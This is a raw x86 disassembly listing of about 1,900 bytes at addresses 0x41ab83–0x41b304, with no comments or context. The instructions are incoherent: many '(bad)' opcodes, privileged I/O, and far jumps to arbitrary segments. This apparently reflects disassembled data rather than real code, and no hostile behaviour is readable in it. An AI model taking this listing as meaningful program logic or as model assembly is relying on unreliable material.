  41ab83:	push   ebx
  41ab84:	sbb    eax,0xd8da5abc
  41ab89:	(bad)  
  41ab8a:	mov    esi,0xdf453727
  41ab8f:	idiv   DWORD PTR [eax]
  41ab91:	or     eax,0x138283d2
  41ab96:	imul   ebx,ecx,0x4f1db55b
  41ab9c:	imul   edx,DWORD PTR [esi],0xffffffcd
  41ab9f:	aas    
  41aba0:	ret    
  41aba1:	aaa    
  41aba2:	push   edi
  41aba3:	adc    al,0x5b
  41aba5:	cmp    DWORD PTR [ecx],eax
  41aba7:	lock inc ebx
  41aba9:	and    al,0xec
  41abab:	xchg   edx,eax
  41abac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abad:	sbb    ah,0x8d
  41abb0:	mov    ecx,DWORD PTR [ebp-0x74bac9eb]
  41abb6:	std    
  41abb7:	cmp    DWORD PTR [ebp-0x3ce568c0],ebp
  41abbd:	cmc    
  41abbe:	sub    ebp,DWORD PTR [eax-0x7e]
  41abc1:	push   ebp
  41abc2:	add    DWORD PTR [ecx-0x41],ecx
  41abc5:	and    cl,bh
  41abc7:	xchg   BYTE PTR [edi+0x4ef56e30],al
  41abcd:	jmp    0x41ab9f
  41abcf:	inc    ebp
  41abd0:	shl    DWORD PTR [edx],cl
  41abd2:	repz mov ah,0x72
  41abd5:	out    0x41,eax
  41abd7:	pop    ss
  41abd8:	ins    DWORD PTR es:[edi],dx
  41abd9:	mov    ecx,0x3ac25d8b
  41abde:	sub    ecx,DWORD PTR ds:0xd7daf58e
  41abe4:	sti    
  41abe5:	iret   
  41abe6:	add    edi,DWORD PTR [eax-0x4b5d48e5]
  41abec:	sahf   
  41abed:	inc    esp
  41abee:	jmp    0x8266:0xe9dab94a
  41abf5:	push   esp
  41abf6:	jbe    0x41ac1e
  41abf8:	jmp    0x74514f13
  41abfd:	(bad)  
  41abff:	push   edi
  41ac00:	jno    0x41ac26
  41ac02:	xchg   ebp,eax
  41ac03:	mov    ah,0xfe
  41ac05:	scas   eax,DWORD PTR es:[edi]
  41ac06:	sbb    DWORD PTR [eax+0x8],ebp
  41ac09:	popa   
  41ac0a:	mov    ebx,DWORD PTR [ebp+0x16]
  41ac0d:	jle    0x41ac34
  41ac0f:	popa   
  41ac10:	mov    esi,DWORD PTR [eax+0x2c]
  41ac13:	das    
  41ac14:	jae    0x41ac18
  41ac16:	cmp    eax,DWORD PTR [ebx]
  41ac18:	add    eax,0xa5c9b1b8
  41ac1d:	xchg   esi,eax
  41ac1e:	dec    ecx
  41ac1f:	xchg   ebp,eax
  41ac20:	mov    al,ds:0x15797ea1
  41ac25:	mov    ds,WORD PTR [esi]
  41ac27:	loopne 0x41ac6e
  41ac29:	cwde   
  41ac2a:	dec    eax
  41ac2b:	cmp    ecx,DWORD PTR [edi]
  41ac2d:	cmp    al,0xcf
  41ac2f:	lahf   
  41ac30:	stc    
  41ac31:	mov    eax,0xa589521e
  41ac36:	loop   0x41ac0f
  41ac38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac3a:	push   cs
  41ac3b:	mov    WORD PTR [edx+0x1ee3bf22],ds
  41ac41:	stc    
  41ac42:	pop    es
  41ac43:	xor    edx,DWORD PTR [ecx+0x78]
  41ac46:	retf   0x9357
  41ac49:	adc    eax,0x8bfda6ad
  41ac4e:	lea    ebx,[ecx-0x1d]
  41ac51:	mov    ecx,DWORD PTR [ecx+0x60]
  41ac54:	cmp    DWORD PTR [eax+0x6c],esi
  41ac57:	push   ds
  41ac58:	push   ss
  41ac59:	dec    edx
  41ac5a:	stc    
  41ac5b:	cdq    
  41ac5c:	adc    BYTE PTR [esi+0x10],ah
  41ac5f:	dec    edi
  41ac60:	dec    edx
  41ac61:	rcl    BYTE PTR [edx-0x36],0xf1
  41ac65:	adc    al,BYTE PTR cs:[edi+0x504c9389]
  41ac6c:	bound  ebx,QWORD PTR [ebp-0x38]
  41ac6f:	pop    edx
  41ac70:	or     ecx,DWORD PTR [esi-0x16]
  41ac73:	sub    cl,dl
  41ac75:	or     al,0xde
  41ac77:	mov    al,ds:0x713319cd
  41ac7c:	or     DWORD PTR [esi],ebp
  41ac7e:	or     DWORD PTR [eax+0x22945057],eax
  41ac84:	cld    
  41ac85:	and    eax,0x90285566
  41ac8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac8b:	pop    esi
  41ac8c:	sub    al,0x53
  41ac8e:	dec    eax
  41ac8f:	rcr    DWORD PTR [eax+0x1c39a6a],0x98
  41ac96:	into   
  41ac97:	add    ebx,ebp
  41ac99:	sbb    BYTE PTR [ebx],al
  41ac9b:	adc    DWORD PTR cs:[ebx+0x7c237738],0xbb0fac09
  41aca6:	(bad)  
  41aca7:	sub    eax,0x345ad89f
  41acac:	push   eax
  41acad:	rcl    esp,cl
  41acaf:	call   0x499a3fa1
  41acb4:	push   cs
  41acb5:	inc    esp
  41acb6:	and    al,0x53
  41acb8:	ret    
  41acb9:	(bad)  
  41acba:	xchg   esi,eax
  41acbc:	inc    eax
  41acbd:	and    esp,DWORD PTR [esp+ebx*8-0x7a]
  41acc1:	pop    es
  41acc2:	aaa    
  41acc3:	in     eax,dx
  41acc4:	dec    esp
  41acc5:	sar    cl,cl
  41acc7:	mov    DWORD PTR [ecx-0x2063dd76],edi
  41accd:	xor    eax,0x4c4b8de7
  41acd2:	jmp    0x81ba:0x833dd555
  41acd9:	test   dl,al
  41acdb:	sbb    al,bl
  41acdd:	or     bl,BYTE PTR [esi+0x36ddc3ef]
  41ace3:	push   eax
  41ace4:	or     BYTE PTR [ebx+0x44],cl
  41ace7:	cmc    
  41ace8:	js     0x41ad65
  41acea:	popf   
  41aceb:	mov    esp,0x99aa3548
  41acf0:	arpl   WORD PTR [ecx+0x13db2ed8],sp
  41acf6:	std    
  41acf7:	(bad)  [ebx+ecx*4]
  41acfa:	cmp    DWORD PTR [esi],0xd4f6ff4d
  41ad00:	mov    al,0x1b
  41ad02:	fistp  WORD PTR [edx-0x58]
  41ad05:	fistp  QWORD PTR [edi+edx*2+0x59a9ced9]
  41ad0c:	adc    eax,0x73ee00ea
  41ad11:	adc    cl,al
  41ad13:	xor    cl,BYTE PTR [ecx+eax*2+0x30ffbe85]
  41ad1a:	pop    ss
  41ad1b:	mov    ecx,DWORD PTR [ebp+0x6b9b0e69]
  41ad21:	pop    es
  41ad22:	(bad)  
  41ad23:	fs jge 0x41ad00
  41ad26:	push   edx
  41ad27:	iret   
  41ad28:	inc    ecx
  41ad29:	mov    esi,0xd3bc59bf
  41ad2e:	test   DWORD PTR [ecx+0x2d],eax
  41ad31:	enter  0xdb2,0xd6
  41ad35:	pop    ebp
  41ad36:	iret   
  41ad37:	fistp  WORD PTR [edi-0x7d]
  41ad3a:	cld    
  41ad3b:	jge    0x41accd
  41ad3d:	cmp    al,BYTE PTR ds:0xeabc63cf
  41ad43:	dec    edi
  41ad44:	jecxz  0x41ace3
  41ad46:	mov    dh,0xe5
  41ad48:	adc    BYTE PTR [ebx],al
  41ad4a:	adc    DWORD PTR [edx+edi*2-0x38],edx
  41ad4e:	jecxz  0x41ad3e
  41ad50:	xchg   al,bl
  41ad52:	mov    dh,0x1
  41ad54:	xor    al,0x99
  41ad56:	cs pop ds
  41ad58:	cmp    DWORD PTR [edx],0xd6177b6
  41ad5e:	jecxz  0x41ad1e
  41ad60:	hlt    
  41ad61:	push   es
  41ad62:	outs   dx,DWORD PTR ds:[esi]
  41ad63:	movntq QWORD PTR [edi-0x797de586],mm5
  41ad6a:	or     eax,0xe7a22c28
  41ad6f:	imul   edx,DWORD PTR [ebx-0x1b],0x5a
  41ad73:	ret    0x908b
  41ad76:	in     al,0x1f
  41ad78:	icebp  
  41ad79:	sar    BYTE PTR [eax-0xb1bdceb],0xf5
  41ad80:	mov    BYTE PTR [ebx+0x6e],ah
  41ad83:	test   al,0xf5
  41ad85:	xchg   ebx,eax
  41ad86:	sub    al,BYTE PTR [edx+ebx*8]
  41ad89:	aad    0xc6
  41ad8b:	neg    DWORD PTR [ecx-0x1e1d404f]
  41ad91:	in     al,0x94
  41ad93:	xor    al,0x2e
  41ad95:	jbe    0x41ad50
  41ad97:	mov    esp,0xdaaecc4
  41ad9c:	arpl   WORD PTR [edi-0x1e],dx
  41ad9f:	(bad)
  41ada3:	pop    ebx
  41ada4:	(bad)  
  41ada5:	jp     0x41ad59
  41ada7:	enter  0x8b23,0x20
  41adab:	mov    al,0x9c
  41adad:	jmp    0x41ade3
  41adaf:	mov    al,ds:0xc4880b9b
  41adb4:	push   edi
  41adb5:	push   ebx
  41adb6:	ficom  WORD PTR [eax-0x1c462ed0]
  41adbc:	aad    0x54
  41adbe:	push   edx
  41adbf:	call   0x9b78:0xf67bbf39
  41adc6:	pop    ebx
  41adc7:	fidiv  WORD PTR [ecx]
  41adc9:	cmp    eax,0x88aad0ac
  41adce:	mov    eax,ds:0xbf00d654
  41add3:	jns    0x41ade1
  41add5:	push   0xffffffc6
  41add7:	sbb    eax,0x48e1ba57
  41addc:	aas    
  41addd:	jno    0x41ad97
  41addf:	or     BYTE PTR [edi+0x560eefc4],cl
  41ade5:	inc    edx
  41ade6:	xor    ebx,DWORD PTR [edx-0x31]
  41ade9:	or     ebp,esi
  41adeb:	pop    es
  41adec:	push   ds
  41aded:	xchg   al,bl
  41adef:	test   DWORD PTR [ecx*1+0x662e157d],eax
  41adf6:	int3   
  41adf7:	in     al,0x1e
  41adf9:	sbb    DWORD PTR [ebp-0x72e2f722],0xc6b117c7
  41ae03:	sbb    BYTE PTR [ebx],dh
  41ae05:	std    
  41ae06:	rcr    DWORD PTR [eax-0x5ab78591],0x56
  41ae0d:	imul   esp,DWORD PTR [esi-0x40],0x6f
  41ae11:	stc    
  41ae12:	cdq    
  41ae13:	retf   0xb461
  41ae16:	sbb    esi,ebx
  41ae18:	cmp    DWORD PTR [ebx+0x4d4ca1ba],edx
  41ae1e:	mov    al,BYTE PTR ds:[eax+0x74]
  41ae22:	imul   ecx,eax,0x9ce53d24
  41ae28:	ror    BYTE PTR [esi+0x4],0x4a
  41ae2c:	(bad)  
  41ae2d:	lods   eax,DWORD PTR ds:[esi]
  41ae2e:	clc    
  41ae2f:	adc    al,0x83
  41ae31:	xchg   edi,eax
  41ae32:	test   esi,esp
  41ae34:	jns    0x41ae4d
  41ae36:	outs   dx,DWORD PTR ds:[esi]
  41ae37:	cmp    DWORD PTR [edi+0x1e0e0467],esi
  41ae3d:	idiv   DWORD PTR [ecx]
  41ae3f:	mov    BYTE PTR [esi+0x4326d97d],cl
  41ae45:	jp     0x41ae60
  41ae47:	sbb    cl,al
  41ae49:	sbb    eax,0x1c7d03ad
  41ae4e:	jp     0x41ae01
  41ae50:	mov    ebx,0x5e7cd0a9
  41ae55:	aad    0x2f
  41ae57:	in     eax,0xc
  41ae59:	les    ecx,FWORD PTR [ebx-0x3b]
  41ae5c:	daa    
  41ae5d:	pop    edx
  41ae5e:	mov    ah,BYTE PTR [ecx]
  41ae60:	scas   al,BYTE PTR es:[edi]
  41ae61:	push   0x34
  41ae63:	mov    edi,0xedcc4bc2
  41ae68:	scas   eax,DWORD PTR es:[edi]
  41ae69:	repnz call 0x4c53:0xdeee53da
  41ae71:	in     eax,0x60
  41ae73:	rcl    ebp,0xb7
  41ae76:	(bad)  
  41ae77:	sub    eax,0xf2b869ef
  41ae7c:	sub    DWORD PTR [ebx+0x9],edx
  41ae7f:	and    DWORD PTR [eax+edx*2],edx
  41ae82:	and    eax,0x135d1ac6
  41ae87:	fistp  QWORD PTR [ebp+ebp*1-0x7694d072]
  41ae8e:	jmp    0x41aea3
  41ae90:	(bad)  
  41ae91:	xor    esp,eax
  41ae93:	mov    ds:0x7acc35a7,al
  41ae98:	(bad)  
  41ae99:	xor    eax,0xe67bf4a0
  41ae9e:	mov    ebp,0x2e24ac11
  41aea3:	xor    dh,BYTE PTR [esi+0x7c078632]
  41aea9:	(bad)  
  41aeaa:	xchg   edx,eax
  41aeab:	or     al,0x74
  41aead:	loop   0x41ae44
  41aeaf:	(bad)  
  41aeb0:	cdq    
  41aeb1:	pop    ecx
  41aeb2:	pop    ebp
  41aeb3:	sbb    ah,bh
  41aeb5:	push   ebp
  41aeb6:	mov    esi,DWORD PTR [edi-0x69]
  41aeb9:	daa    
  41aeba:	push   edi
  41aebb:	xchg   DWORD PTR [edi-0x27bdb5a6],edx
  41aec1:	ins    DWORD PTR es:[edi],dx
  41aec2:	add    esi,DWORD PTR [edi]
  41aec4:	cmc    
  41aec5:	stos   BYTE PTR es:[edi],al
  41aec6:	aad    0xfc
  41aec8:	push   eax
  41aec9:	aad    0x56
  41aecb:	wbinvd 
  41aecd:	retf   0xcbd
  41aed0:	fimul  DWORD PTR [ecx+0x78]
  41aed3:	mov    edi,0xc189e198
  41aed8:	push   ebx
  41aed9:	jo     0x41af23
  41aedb:	mov    ah,0x8d
  41aedd:	dec    ecx
  41aede:	pop    ebp
  41aedf:	out    0x9e,eax
  41aee1:	xchg   edx,eax
  41aee2:	or     ch,BYTE PTR [eax-0x1a]
  41aee5:	jne    0x41af5d
  41aee7:	sbb    eax,0xcfc851ea
  41aeec:	cmp    bh,BYTE PTR [ecx]
  41aeee:	cli    
  41aeef:	into   
  41aef0:	cli    
  41aef1:	mov    DWORD PTR [edi],edi
  41aef3:	bound  eax,QWORD PTR [esi+edi*1-0x2e]
  41aef7:	(bad)  
  41aef8:	or     al,0x3c
  41aefa:	add    ebp,edi
  41aefc:	sbb    bh,0x7d
  41aeff:	addr16 sar bl,0x1c
  41af03:	mov    DWORD PTR [ebp+0x6ca5e491],ecx
  41af09:	mov    dl,0x96
  41af0b:	inc    ebp
  41af0c:	mov    ch,0x14
  41af0e:	int3   
  41af0f:	(bad)  
  41af10:	ds mov ebp,0x74c09473
  41af16:	lods   eax,DWORD PTR ds:[esi]
  41af17:	cwde   
  41af18:	sbb    edx,ebp
  41af1a:	mov    eax,ds:0x1803ccc5
  41af1f:	aad    0xc6
  41af21:	or     al,BYTE PTR ds:0xa853517
  41af27:	xor    BYTE PTR [ebp-0x79],0xff
  41af2b:	sub    dl,ah
  41af2d:	sub    al,0xb3
  41af2f:	adc    esp,DWORD PTR [ebx]
  41af31:	std    
  41af32:	sbb    BYTE PTR [edx-0x67],ah
  41af35:	sbb    BYTE PTR [edx],bh
  41af37:	add    eax,0x4da0f345
  41af3c:	cmp    eax,0x18c207cf
  41af41:	mov    ebx,0x836ecc0
  41af46:	test   BYTE PTR [eax],0xa3
  41af49:	loop   0x41af00
  41af4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41af4c:	cmp    al,0x8e
  41af4e:	scas   eax,DWORD PTR es:[edi]
  41af4f:	sub    esi,DWORD PTR [edi+ecx*4-0x2a]
  41af53:	and    al,0xde
  41af55:	sbb    ebx,DWORD PTR ds:0xe1a6939a
  41af5b:	fcomi  st,st(0)
  41af5d:	cmp    DWORD PTR [ebp-0x65],ecx
  41af60:	xchg   ecx,eax
  41af61:	cs pcmpgtw mm4,mm3
  41af65:	out    0xae,eax
  41af67:	ret    0xc793
  41af6a:	mov    al,0x8d
  41af6c:	jle    0x41af7b
  41af6e:	cmp    BYTE PTR [eax-0x5f],0xb0
  41af72:	popf   
  41af73:	mov    ch,0x6f
  41af75:	fisub  DWORD PTR [esi]
  41af77:	pop    esp
  41af78:	(bad)  
  41af79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af7a:	pushf  
  41af7b:	jne    0x41afaa
  41af7d:	jmp    0x41af90
  41af7f:	in     al,0xde
  41af81:	add    BYTE PTR [ecx],dl
  41af83:	add    DWORD PTR [ebp-0x39764986],esi
  41af89:	enter  0x390e,0x4e
  41af8d:	cs jg  0x41af88
  41af90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af91:	(bad)  
  41af92:	cmp    al,0x53
  41af94:	mov    DWORD PTR [eax+0x39eacdad],esp
  41af9a:	push   eax
  41af9b:	and    bh,BYTE PTR [esi]
  41af9d:	jge    0x41af28
  41af9f:	xchg   ebp,eax
  41afa0:	repz call 0xcde7:0x53278d79
  41afa8:	add    bl,BYTE PTR [edi-0x11e38890]
  41afae:	cmp    BYTE PTR ds:0x4271333c,0x78
  41afb5:	(bad)  
  41afb6:	jnp    0x41b01d
  41afb8:	jecxz  0x41afcc
  41afba:	aam    0xaf
  41afbc:	or     ebx,0x720d6d9f
  41afc2:	out    dx,eax
  41afc3:	arpl   WORD PTR [edi+0xa],ax
  41afc6:	shr    BYTE PTR [ecx-0x635f5f9e],1
  41afcc:	inc    edx
  41afcd:	stos   DWORD PTR es:[edi],eax
  41afce:	or     cl,BYTE PTR [esi+0x5793472d]
  41afd4:	push   esi
  41afd5:	das    
  41afd6:	push   ebp
  41afd7:	dec    ecx
  41afd8:	inc    ecx
  41afd9:	cmp    al,0xc5
  41afdb:	hlt    
  41afdc:	inc    ecx
  41afdd:	sti    
  41afde:	mov    bl,0x39
  41afe0:	add    eax,0x182d7d43
  41afe5:	stos   DWORD PTR es:[edi],eax
  41afe6:	scas   al,BYTE PTR es:[edi]
  41afe7:	inc    edi
  41afe8:	sahf   
  41afe9:	cmp    eax,0x6bfd20a1
  41afee:	adc    al,0x49
  41aff0:	or     edi,DWORD PTR [edx+0x19b25bda]
  41aff6:	mov    esp,0xfd7f995a
  41affb:	cmp    DWORD PTR [edx+0x45e6b794],ebx
  41b001:	imul   ecx,DWORD PTR [edi+0x2d274941],0xfffffffd
  41b008:	or     eax,0x874da2d4
  41b00d:	out    dx,eax
  41b00e:	mov    dh,0x42
  41b010:	int3   
  41b011:	mov    dh,0xe
  41b013:	cmp    BYTE PTR [esi+ecx*2+0x1b],0x2e
  41b018:	(bad)  
  41b019:	cwde   
  41b01a:	sub    DWORD PTR [edi+edi*1+0x67],edi
  41b01e:	in     eax,dx
  41b01f:	adc    eax,0xc2d114b7
  41b024:	leave  
  41b025:	jle    0x41afde
  41b027:	push   eax
  41b028:	xchg   edi,eax
  41b029:	add    dl,dl
  41b02b:	je     0x41aff8
  41b02d:	outs   dx,DWORD PTR ds:[esi]
  41b02e:	(bad)  
  41b02f:	xchg   ebp,eax
  41b030:	push   ebp
  41b031:	xor    cl,BYTE PTR [esi]
  41b033:	pop    ebp
  41b034:	daa    
  41b035:	cmp    BYTE PTR [ebp-0x12],ah
  41b038:	xor    BYTE PTR [ebp-0x6e57df09],ah
  41b03e:	push   edi
  41b03f:	js     0x41aff0
  41b041:	mov    ch,0x32
  41b043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b044:	or     BYTE PTR [edx+0x34],bl
  41b047:	fnstcw WORD PTR [ecx+0x6231ddf7]
  41b04d:	(bad)  
  41b04e:	sub    DWORD PTR [eax+edi*1],edi
  41b051:	leave  
  41b052:	fwait
  41b053:	popa   
  41b054:	pop    edx
  41b055:	jnp    0x41b079
  41b057:	ss scas eax,DWORD PTR es:[edi]
  41b059:	cdq    
  41b05a:	hlt    
  41b05b:	add    eax,0xf4bcb790
  41b060:	or     ecx,eax
  41b062:	jmp    0x21bd:0x8ef0aba5
  41b069:	repz popf 
  41b06b:	mov    ecx,DWORD PTR [ebx+0x2b]
  41b06e:	jns    0x41b03d
  41b070:	mov    eax,0x604b1ae2
  41b075:	in     eax,dx
  41b076:	mov    al,ds:0xe061e78b
  41b07b:	(bad)  
  41b07c:	add    eax,0xcced9718
  41b081:	jmp    0x41b0d7
  41b083:	lods   al,BYTE PTR ds:[esi]
  41b084:	add    DWORD PTR [esi],ecx
  41b086:	aas    
  41b087:	mov    al,ds:0x66ad1df4
  41b08c:	sub    edi,eax
  41b08e:	rcl    DWORD PTR [esi+0x79851bdc],cl
  41b094:	cmp    al,0xd9
  41b096:	imul   ecx,DWORD PTR [ecx-0x74],0xd8436d4d
  41b09d:	xchg   esi,eax
  41b09e:	loop   0x41b0e1
  41b0a0:	ficomp WORD PTR [edi]
  41b0a2:	push   0xcb92eb95
  41b0a7:	mov    al,0x2
  41b0a9:	stos   BYTE PTR es:[edi],al
  41b0aa:	das    
  41b0ab:	sbb    DWORD PTR [ebx-0x49784c4c],ebp
  41b0b1:	gs sub al,dh
  41b0b4:	and    BYTE PTR [ebp-0x2f16d4ed],0xc2
  41b0bb:	repnz jmp 0x2f72:0xa64c80fa
  41b0c3:	stos   DWORD PTR es:[edi],eax
  41b0c4:	(bad)  
  41b0c5:	repnz loop 0x41b113
  41b0c8:	and    DWORD PTR [ecx],esp
  41b0ca:	jnp    0x41b0c0
  41b0cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0cd:	add    BYTE PTR [eax],0x48
  41b0d0:	out    0x3d,al
  41b0d2:	mov    cl,0x6c
  41b0d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b0d5:	stos   BYTE PTR es:[edi],al
  41b0d6:	ret    0xaed
  41b0d9:	jmp    0xbc88:0x121dc696
  41b0e0:	mov    bl,0x4a
  41b0e2:	lods   al,BYTE PTR ds:[esi]
  41b0e3:	mov    ds:0xb2912385,eax
  41b0e8:	fdiv   QWORD PTR [edi]
  41b0ea:	mov    ebp,0xb595229b
  41b0ef:	test   DWORD PTR [edx],edx
  41b0f1:	(bad)  
  41b0f2:	mov    ds:0xc32e69c6,eax
  41b0f7:	dec    ecx
  41b0f8:	cld    
  41b0f9:	dec    esp
  41b0fa:	pop    eax
  41b0fb:	add    eax,0x6b5f3b00
  41b100:	in     eax,dx
  41b101:	dec    ebx
  41b102:	jo     0x41b11c
  41b104:	std    
  41b105:	arpl   WORD PTR [edi-0x78afc7a0],sp
  41b10b:	pop    edx
  41b10c:	(bad)  
  41b10e:	int3   
  41b10f:	mov    ecx,0x9e137e4b
  41b114:	fadd   QWORD PTR [eax]
  41b116:	popf   
  41b117:	into   
  41b118:	pop    ebp
  41b119:	and    al,0xcd
  41b11b:	das    
  41b11c:	sbb    BYTE PTR [edx+eax*2+0x26d4e801],al
  41b123:	(bad)  
  41b124:	cli    
  41b125:	and    al,0xba
  41b127:	mov    bl,0xe6
  41b129:	push   esp
  41b12a:	ds and al,0xb8
  41b12d:	loope  0x41b0bd
  41b12f:	cmp    DWORD PTR [eax],edx
  41b131:	xchg   DWORD PTR [edx],eax
  41b133:	sub    al,0x83
  41b135:	in     eax,0x0
  41b137:	cmp    dh,dl
  41b139:	push   ss
  41b13a:	pushf  
  41b13b:	push   edx
  41b13c:	(bad)  
  41b13d:	std    
  41b13e:	pop    esi
  41b13f:	test   BYTE PTR [ecx],bl
  41b141:	mov    esp,0x7dd11de3
  41b146:	push   ebx
  41b147:	cmp    esp,DWORD PTR [eax]
  41b149:	adc    al,0xe2
  41b14b:	mov    cl,0xba
  41b14d:	lock out dx,eax
  41b14f:	pop    ebx
  41b150:	loop   0x41b11c
  41b152:	add    al,0xa1
  41b154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b155:	loopne 0x41b121
  41b157:	rol    DWORD PTR [eax],1
  41b159:	lods   eax,DWORD PTR ds:[esi]
  41b15a:	shl    BYTE PTR [eax-0x7d],1
  41b15d:	neg    DWORD PTR [ebp+0x47]
  41b160:	int    0xf4
  41b162:	pop    ss
  41b163:	jae    0x41b19a
  41b165:	rol    BYTE PTR [eax-0x11],1
  41b168:	retf   
  41b169:	jbe    0x41b144
  41b16b:	xchg   edx,eax
  41b16c:	repz and dl,BYTE PTR [ecx]
  41b16f:	neg    cl
  41b171:	fs or  ch,cl
  41b174:	mov    BYTE PTR [eax+edx*2-0x62d2ea7b],dl
  41b17b:	arpl   WORD PTR [eax],si
  41b17d:	xchg   esp,eax
  41b17e:	adc    al,0xfe
  41b180:	fwait
  41b181:	xor    cl,ch
  41b183:	lea    esp,[ebx+ebp*2-0x40d53443]
  41b18a:	retf   0x7cae
  41b18d:	rcl    DWORD PTR [edx],1
  41b18f:	xor    esi,DWORD PTR [esp+ecx*2-0x2b]
  41b193:	scas   al,BYTE PTR es:[edi]
  41b194:	enterw 0xa8c7,0xb6
  41b199:	js     0x41b14c
  41b19b:	add    al,0x35
  41b19d:	popf   
  41b19e:	outs   dx,BYTE PTR ds:[esi]
  41b19f:	sub    eax,ebx
  41b1a1:	add    eax,0xe3df3ef3
  41b1a6:	or     al,0xdc
  41b1a8:	sahf   
  41b1a9:	mov    esp,0x7d7b5c3f
  41b1ae:	dec    esp
  41b1af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1b0:	clc    
  41b1b1:	add    DWORD PTR [edi],ecx
  41b1b3:	sar    DWORD PTR [ecx],0xab
  41b1b6:	or     eax,0x9ee4bbd1
  41b1bb:	inc    edx
  41b1bc:	jmp    0x41b177
  41b1be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b1bf:	sub    ebx,ecx
  41b1c1:	fyl2x  
  41b1c3:	push   ebp
  41b1c4:	jae    0x41b17c
  41b1c6:	pushf  
  41b1c7:	test   DWORD PTR [eax+eax*2+0x48],0xa0959285
  41b1cf:	mov    dl,0x6b
  41b1d1:	ficomp DWORD PTR [ebp-0x432edc9f]
  41b1d7:	mov    ds:0x61662211,eax
  41b1dc:	jge    0x41b1e9
  41b1de:	mov    edi,0xf2210bbf
  41b1e3:	outs   dx,BYTE PTR ds:[esi]
  41b1e4:	xchg   edx,eax
  41b1e5:	pop    DWORD PTR [ecx+0x2de6d415]
  41b1eb:	clc    
  41b1ec:	in     al,dx
  41b1ed:	outs   dx,DWORD PTR ds:[esi]
  41b1ee:	sub    ebp,edi
  41b1f0:	jmp    0x1bc9e297
  41b1f5:	cld    
  41b1f6:	xor    cl,BYTE PTR [esi-0x68ef346a]
  41b1fc:	mov    WORD PTR [ebx-0x1e2c9cfc],fs
  41b202:	dec    ecx
  41b203:	pop    ds
  41b204:	je     0x41b1ac
  41b206:	hlt    
  41b207:	inc    ecx
  41b208:	inc    eax
  41b209:	mov    dl,0x7a
  41b20b:	out    dx,al
  41b20c:	arpl   ax,cx
  41b20e:	int    0xa2
  41b210:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b211:	mov    cl,BYTE PTR [esi+edi*1+0x73ba60b1]
  41b218:	out    dx,al
  41b219:	pop    ebx
  41b21a:	call   0x81bcbb14
  41b21f:	xor    DWORD PTR [ebx-0x18d1d512],esp
  41b225:	aaa    
  41b226:	mov    dl,0xc8
  41b228:	mov    ds:0x81ae9a41,eax
  41b22d:	xchg   ebx,eax
  41b22e:	sub    al,0xb5
  41b230:	icebp  
  41b231:	mov    bl,0x94
  41b233:	sti    
  41b234:	sbb    al,0x6b
  41b236:	mov    al,0xd2
  41b238:	push   0xffffffc7
  41b23a:	js     0x41b20f
  41b23c:	stc    
  41b23d:	mov    dl,0xac
  41b23f:	xchg   ebp,eax
  41b240:	dec    esi
  41b241:	sbb    BYTE PTR [edx+0x74],al
  41b244:	out    dx,al
  41b245:	dec    eax
  41b246:	loop   0x41b292
  41b248:	fxsave [edx+0x58]
  41b24c:	rol    cl,cl
  41b24e:	lea    ecx,[ebx-0x3d3d4b1b]
  41b254:	mov    bh,0x6f
  41b256:	test   eax,0x22687a84
  41b25b:	or     DWORD PTR [ecx+0x527105cd],esp
  41b261:	jnp    0x41b24d
  41b263:	pop    ds
  41b264:	add    BYTE PTR [eax],ch
  41b266:	cmp    ch,0x25
  41b269:	sub    al,al
  41b26b:	pushf  
  41b26c:	xchg   bh,al
  41b26e:	pop    ebx
  41b26f:	fld    DWORD PTR [eax+0x391ee174]
  41b275:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b276:	pop    edx
  41b277:	test   DWORD PTR [edx],0xe0367361
  41b27d:	lahf   
  41b27e:	(bad)  
  41b27f:	in     al,0xa0
  41b281:	cdq    
  41b282:	mov    edi,0x9a785cd6
  41b287:	cli    
  41b288:	jnp    0x41b231
  41b28a:	adc    eax,0xca062c1d
  41b28f:	clc    
  41b290:	or     esp,DWORD PTR [ecx-0x5a]
  41b293:	pop    ebp
  41b294:	gs aam 0x7
  41b297:	sbb    bl,cl
  41b299:	bound  esp,QWORD PTR [ecx]
  41b29b:	inc    edi
  41b29c:	cmp    DWORD PTR [edi+0x54d869b6],eax
  41b2a2:	add    edi,DWORD PTR [esi-0x6ffb40a5]
  41b2a8:	mov    edi,ss
  41b2aa:	jns    0x41b270
  41b2ac:	mov    eax,ecx
  41b2ae:	aaa    
  41b2af:	shl    DWORD PTR [edi+ebx*1-0x300b716f],cl
  41b2b6:	ss inc ebx
  41b2b8:	sar    bh,0xe8
  41b2bb:	jb     0x41b304
  41b2bd:	dec    edi
  41b2be:	adc    bl,BYTE PTR [ecx+0x205337d9]
  41b2c4:	xlat   BYTE PTR ds:[ebx]
  41b2c5:	push   esp
  41b2c6:	mov    ebx,0xf7136c68
  41b2cb:	and    eax,edi
  41b2cd:	mov    WORD PTR [ebx+0x57],?
  41b2d0:	pop    ss
  41b2d1:	(bad)  
  41b2d2:	push   0x22
  41b2d4:	dec    ebp
  41b2d5:	jmp    0xe6107820
  41b2da:	adc    ebx,DWORD PTR [ebp+0x13df609a]
  41b2e0:	pusha  
  41b2e1:	ret    0x3739
  41b2e4:	ins    DWORD PTR es:[edi],dx
  41b2e5:	pandn  mm1,QWORD PTR [ebx-0x4e]
  41b2e9:	jmp    0x39937ba6
  41b2ee:	jae    0x41b2f8
  41b2f0:	repnz scas eax,DWORD PTR es:[edi]
  41b2f2:	mov    eax,0x93a0efae
  41b2f7:	ret    0x3249
  41b2fa:	std    
  41b2fb:	adc    eax,0x6a434b6c
  41b300:	mov    BYTE PTR [eax],al
  41b302:	mov    cl,BYTE PTR [edx]
  41b304:	test   DWORD PTR [ebx-0x7710d1f1],0xfc866466
